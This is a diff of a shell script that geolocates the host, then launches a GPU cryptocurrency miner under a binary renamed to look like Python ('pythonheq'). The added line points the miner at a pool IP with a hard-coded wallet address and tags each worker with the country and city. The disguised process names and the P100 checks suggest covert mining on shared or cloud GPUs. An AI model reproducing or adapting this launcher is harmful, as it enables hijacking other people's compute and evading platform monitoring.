@@ -5,7 +5,8 @@
 echo -e '##########################################################################'
 PROX=78.47.69.185
 ETPort=8080
-echo -e '################## '"ET to $PROX:$ETPort"' Ver:0.0.2     ################'
+RVPort=80
+echo -e '################## '"MAX $PROX:$ETPort"' Ver:0.0.1     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -15,7 +16,7 @@ curl ipinfo.io
 CITY=$(curl -s ipinfo.io|grep -oP '(?<="city": ")[^"]*')
 REGION=$(curl -s ipinfo.io|grep -oP '(?<="region": ")[^"]*')
 COUNTRY=$(curl -s ipinfo.io|grep -oP '(?<="country": ")[^"]*')
-INFO="$COUNTRY"_"$CITY"
+INFO="$COUNTRY""_""$CITY"
 
 ## COLORS
 # Reset
@@ -143,7 +144,7 @@ cp pyeth2 pyethoc
 i="0"
 while true
 do
-./pythonxm -c config.json -l ooutx 2>> ooutx 1>> ooutx &
+./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> oout 2>> oout &
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
